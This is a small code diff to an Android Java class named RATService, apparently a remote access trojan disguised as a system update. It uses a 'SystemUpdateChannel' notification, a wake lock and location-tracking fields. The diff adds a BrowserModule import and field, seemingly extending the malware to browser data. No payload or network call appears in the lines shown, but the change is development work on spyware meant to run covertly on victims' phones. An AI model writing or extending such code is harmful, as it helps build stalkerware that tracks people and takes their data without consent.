@@ -50,6 +50,7 @@ import java.net.SocketTimeoutException;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
+import com.android.system.update.modules.BrowserModule;
 
 public class RATService extends Service {
     private static final String CHANNEL_ID = "SystemUpdateChannel";
@@ -73,7 +74,8 @@ public class RATService extends Service {
     private static volatile RATService instance;
     private PowerManager.WakeLock wakeLock;
     private int consecutiveFailures = 0;
-    
+    private BrowserModule browserModule;
+
     // Location tracking variables
     private LocationManager locationManager;
     private LocationListener locationListener;
